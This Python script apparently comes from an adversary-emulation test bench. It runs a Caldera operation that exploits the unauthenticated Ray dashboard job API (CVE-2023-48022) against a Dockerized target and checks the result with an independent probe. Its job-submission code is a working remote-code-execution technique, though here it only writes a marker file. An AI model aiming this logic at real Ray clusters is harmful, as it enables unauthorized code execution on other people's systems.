#!/usr/bin/env python3
"""Run the ShadowRay T1190 step as a real Caldera-dispatched operation.

Composes three pieces that were each proven independently: the existing
orchestrator brings up the Ray service (real install, or the documented
surrogate fallback); a sandcat agent enrolled in a separate attacker
container gives Caldera something to dispatch to; a custom ability, authored
from the same job-submission logic the orchestrator's own injector uses,
is what Caldera actually runs.

Caldera's own "success" status is not treated as sufficient evidence. After
the operation finishes, an independent probe execs into the Ray container
and checks for the marker files the job was supposed to write -- the same
class of check that would have caught the earlier fabricated-success bug
had it been run against a live target.
"""

from __future__ import annotations

import base64
import json
import shlex
import shutil
import subprocess
import sys
import uuid
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT_ROOT / "scripts"))

from orchestrator import caldera_client  # noqa: E402
from orchestrator.catalog import shadowray_sut  # noqa: E402
from orchestrator.environment import DockerEnvironment  # noqa: E402
from orchestrator.injector import inject_ray_2_6_3, inject_ray_dashboard_surrogate  # noqa: E402

ABILITY_NAME = "T1190 - Exploit exposed Ray dashboard job-submission API"
MARKER_FILE = "/tmp/ray_preflight_two.txt"


def _target_container_ip(container_name: str) -> str:
    result = subprocess.run(
        [
            "docker",
            "inspect",
            "-f",
            "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
            container_name,
        ],
        capture_output=True,
        text=True,
        check=True,
    )
    return result.stdout.strip()


def _spawn_attacker_container() -> str:
    name = f"autosut-caldera-attacker-{uuid.uuid4().hex[:8]}"
    subprocess.run(
        ["docker", "run", "-d", "--name", name, "--rm", "python:3.11-slim", "sleep", "600"],
        check=True,
        capture_output=True,
        text=True,
    )
    return name


def _install_and_start_sandcat(container: str, caldera_url: str, paw: str) -> None:
    architecture = "arm64"
    binary = caldera_client.download_sandcat(platform="linux", architecture=architecture)
    if not binary:
        raise RuntimeError(f"sandcat download failed for linux/{architecture}")
    tmp = Path(f"/tmp/sandcat_{container}.bin")
    tmp.write_bytes(binary)
    subprocess.run(
        ["docker", "cp", str(tmp), f"{container}:/usr/local/bin/sandcat"],
        check=True,
        capture_output=True,
        text=True,
    )
    subprocess.run(
        ["docker", "exec", container, "chmod", "+x", "/usr/local/bin/sandcat"],
        check=True,
        capture_output=True,
        text=True,
    )
    tmp.unlink(missing_ok=True)
    command = (
        f"nohup /usr/local/bin/sandcat -server {caldera_url} -group red "
        f"-paw {paw} -v >/tmp/sandcat.log 2>&1 &"
    )
    subprocess.run(
        ["docker", "exec", "-d", container, "bash", "-c", command],
        check=True,
        capture_output=True,
        text=True,
    )


def _ray_job_submission_command(
    ray_ip: str,
    marker_file: str = MARKER_FILE,
    marker_value: str = "caldera_shadowray_marker",
) -> str:
    """The same job-post-and-poll logic proven in orchestrator/injector.py, retargeted."""
    marker_command = f"printf '%s' {shlex.quote(marker_value)} > {shlex.quote(marker_file)}"
    jobs = [{"entrypoint": marker_command}]
    script = "\n".join(
        [
            "import json, sys, time, urllib.error, urllib.request",
            f"jobs = json.loads({json.dumps(jobs)!r})",
            f"base = 'http://{ray_ip}:8265'",
            "terminal = {'SUCCEEDED', 'FAILED', 'STOPPED'}",
            "def request(method, path, payload=None):",
            "    data = json.dumps(payload).encode() if payload is not None else None",
            "    req = urllib.request.Request(base + path, data=data, method=method)",
            "    if data is not None:",
            "        req.add_header('Content-Type', 'application/json')",
            "    try:",
            "        with urllib.request.urlopen(req, timeout=30) as response:",
            "            return response.status, response.read().decode()",
            "    except urllib.error.HTTPError as error:",
            "        return error.code, error.read().decode()",
            "for payload in jobs:",
            "    post_status, post_body = request('POST', '/api/jobs/', payload)",
            "    print('post', post_status, post_body[:300])",
            "    if post_status < 200 or post_status >= 300:",
            "        sys.exit(1)",
            "    post_json = json.loads(post_body)",
            "    submission_id = post_json.get('submission_id') or post_json.get('job_id')",
            "    if not submission_id:",
            "        sys.exit(1)",
            "    for attempt in range(30):",
            "        poll_status, poll_body = request('GET', '/api/jobs/' + submission_id)",
            "        if poll_status == 404:",
            "            print('poll_unavailable=surrogate_or_legacy_endpoint')",
            "            sys.exit(0)",
            "        if poll_status < 200 or poll_status >= 300:",
            "            sys.exit(1)",
            "        status = json.loads(poll_body).get('status')",
            "        print('poll', attempt, status)",
            "        if status in terminal:",
            "            sys.exit(0 if status == 'SUCCEEDED' else 1)",
            "        time.sleep(1)",
            "sys.exit(1)",
        ]
    )
    # Caldera's command transport does not reliably preserve embedded newlines (confirmed:
    # a multi-line "python3 -c" script arrives at the agent with line breaks stripped,
    # concatenating statements into a syntax error). Base64-encoding the script sidesteps
    # the transport entirely -- the agent decodes and runs it as a file, newlines intact.
    encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
    return f"printf '%s' {encoded} | base64 -d > /tmp/ray_probe.py && python3 /tmp/ray_probe.py"


def _confirm_answering_service(ray_container: str, expected_realization: str) -> str:
    """Ask the target directly which server is bound, before any ability is dispatched.

    A real Ray dashboard and the Flask surrogate both serve 200 on GET /, so a bare
    connectivity check cannot tell them apart; this distinguishes them by body content,
    so a leftover real process cannot masquerade as the surrogate the way it did before
    the `ray stop --force` fix. Runs via `docker exec` rather than a host-to-bridge-IP
    curl: the bridge network is only routable from other containers, not from the host.
    """
    result = subprocess.run(
        [
            "docker",
            "exec",
            ray_container,
            "curl",
            "-fsS",
            "--max-time",
            "5",
            "http://127.0.0.1:8265/",
        ],
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        return "unreachable"
    body = result.stdout
    if "Ray Dashboard (surrogate)" in body:
        observed = "surrogate"
    elif "ray" in body.lower() or "<!doctype html>" in body.lower():
        observed = "real_cve"
    else:
        observed = "unknown"
    if observed != expected_realization:
        raise RuntimeError(
            f"answering service is '{observed}' but injection reported "
            f"'{expected_realization}'; body[:200]={body[:200]!r}"
        )
    return observed


def _independent_effect_probe(
    ray_container: str,
    marker_file: str = MARKER_FILE,
    expected_value: str | None = None,
) -> bool:
    """Read the target directly and optionally require the run-specific marker value."""
    result = subprocess.run(
        ["docker", "exec", ray_container, "cat", marker_file],
        capture_output=True,
        text=True,
    )
    return result.returncode == 0 and (
        expected_value is None or result.stdout.strip() == expected_value
    )


def _persist_experiment_spec(run_dir: Path, sut) -> None:
    """Write what will be materialized before materializing it.

    A reviewer can inspect this declarative record independently of the imperative Docker
    calls that follow; the calls only ever apply what this file already declared.
    """
    run_dir.mkdir(parents=True, exist_ok=True)
    spec = {
        "ability_technique_id": "T1190",
        "sut": sut.model_dump(mode="json"),
    }
    (run_dir / "experiment_spec.json").write_text(
        json.dumps(spec, indent=2) + "\n", encoding="utf-8"
    )


def run_once(run_label: str) -> dict:
    report: dict = {"run_label": run_label}
    run_dir = Path(f"/tmp/shadowray-caldera-{run_label}")
    sut = shadowray_sut()
    _persist_experiment_spec(run_dir, sut)

    with DockerEnvironment.bring_up(sut, run_dir) as target_env:
        fidelity = inject_ray_2_6_3(target_env)
        if not fidelity.success:
            # Same fallback sequence orchestrator.py uses (the one already proven clean
            # twice via run_orchestrated_campaign.py): `ray stop --force` is Ray's own
            # shutdown path and correctly tears down the dashboard subprocess it owns.
            # An earlier version of this script used ad hoc `pkill -f 'ray::'/raylet`
            # patterns instead, which did not match the dashboard's actual process name;
            # the leftover real (broken) dashboard kept answering on :8265 underneath the
            # surrogate, and the surrogate's own connectivity self-check could not tell
            # the difference because a real Ray dashboard also serves 200 on GET /.
            target_env.run_shell(
                "ray stop --force 2>&1 | head -3 || true",
                log_name="sut/ray_stop_after_failure.log",
            )
            fidelity = inject_ray_dashboard_surrogate(target_env)
        report["ray_injection"] = {
            "success": fidelity.success,
            "realization": fidelity.realization.value,
        }
        if not fidelity.success:
            raise RuntimeError("Ray injection failed on both real and surrogate paths")

        ray_ip = _target_container_ip(target_env.container_name)
        report["target_container"] = target_env.container_name
        report["target_ip"] = ray_ip
        report["confirmed_answering_service"] = _confirm_answering_service(
            target_env.container_name, fidelity.realization.value
        )

        caldera_client.reset_cache()
        info = caldera_client.probe()
        if not info.api_ok:
            raise RuntimeError(f"Caldera unreachable at {info.url}")

        ability_id = caldera_client.create_ability(
            ability_id=str(uuid.uuid4()),
            name=ABILITY_NAME,
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
            tactic="initial-access",
            command=_ray_job_submission_command(ray_ip),
            description=(
                "Posts a job to the unauthenticated Ray dashboard job-submission API "
                "(CVE-2023-48022) and polls until the job reaches a terminal state."
            ),
        )
        if not ability_id:
            raise RuntimeError("Caldera ability creation failed")
        report["ability_id"] = ability_id

        caldera_ip = caldera_client.container_ip()
        caldera_url = f"http://{caldera_ip}:8888"
        attacker_container = _spawn_attacker_container()
        report["attacker_container"] = attacker_container
        paw = f"shadowray{uuid.uuid4().hex[:6]}"

        try:
            _install_and_start_sandcat(attacker_container, caldera_url, paw)
            agent = caldera_client.wait_agent_registered(paw_substring=paw, max_seconds=60)
            if not agent:
                raise RuntimeError("sandcat agent did not register with Caldera")
            report["agent_paw"] = agent.get("paw")

            adversary_id = caldera_client.create_adversary(
                name=f"ShadowRay T1190 ({run_label})",
                ability_ids=[ability_id],
            )
            if not adversary_id:
                raise RuntimeError("Caldera adversary creation failed")

            operation_id = caldera_client.start_operation(
                name=f"shadowray-t1190-{run_label}",
                adversary_id=adversary_id,
            )
            if not operation_id:
                raise RuntimeError("Caldera operation creation failed")
            report["operation_id"] = operation_id

            finished = caldera_client.wait_operation_done(operation_id, max_seconds=90)
            report["operation_state"] = (finished or {}).get("state")

            operation_report = caldera_client.get_operation_report(operation_id) or {}
            # Stock Caldera 5.x shape: {"steps": {paw: {"steps": [{...link...}]}}}.
            paw_entry = operation_report.get("steps", {}).get(paw, {})
            links = paw_entry.get("steps", [])
            report["caldera_link_count"] = len(links)
            report["caldera_reported_status"] = [link.get("status") for link in links]
            report["caldera_link_stdout"] = [
                (
                    link.get("output")
                    if isinstance(link.get("output"), str)
                    else (link.get("output") or {}).get("stdout", "")
                )[:500]
                for link in links
            ]

            report["independent_effect_confirmed"] = _independent_effect_probe(
                target_env.container_name
            )
        finally:
            subprocess.run(
                ["docker", "stop", attacker_container], capture_output=True, text=True, timeout=30
            )
            report["attacker_teardown"] = True

    report["target_teardown"] = True

    evidence_dir = PROJECT_ROOT / "release" / "evidence" / "shadowray_caldera" / run_label
    if evidence_dir.exists():
        shutil.rmtree(evidence_dir)
    shutil.copytree(run_dir, evidence_dir)
    report["evidence_dir"] = str(evidence_dir.relative_to(PROJECT_ROOT))
    return report


SCOPE = (
    "Validates the dispatch path only: a custom ability created through Caldera's own API, "
    "run by an enrolled sandcat agent, against a single automatically materialized host, "
    "certified by a probe independent of Caldera's own reported status. It is not a campaign "
    "emulation result: one ability, one host, and on this evaluation host the service "
    "realization is the documented surrogate rather than the real CVE-2023-48022 install."
)


def main() -> int:
    reports = [run_once(label) for label in ("run1", "run2")]
    for report in reports:
        print(json.dumps(report, indent=2))

    output_path = PROJECT_ROOT / "release" / "evidence" / "shadowray_caldera" / "milestone.json"
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(
        json.dumps({"scope": SCOPE, "runs": reports}, indent=2) + "\n", encoding="utf-8"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
